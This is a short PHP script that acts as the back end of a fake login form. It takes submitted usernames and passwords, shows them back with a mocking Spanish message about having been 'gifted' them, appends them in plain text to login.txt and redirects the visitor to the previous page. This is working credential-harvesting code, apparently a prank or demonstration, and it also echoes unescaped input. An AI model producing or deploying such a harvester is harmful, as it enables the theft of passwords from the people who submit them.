<?php
$username = $_POST["username"];
$password = $_POST["password"];

echo "<pre>
así que tus credenciales son username=".$username." y password=".$password.", no?
gracias por regalárnoslas, procedemos a guardarlas en nuestro registro ;)


".file_get_contents("clay.txt")."</pre>";

file_put_contents("login.txt",$username.":".$password."\n",FILE_APPEND);

header("refresh:3;url=".$_SERVER["HTTP_REFERER"]);
?>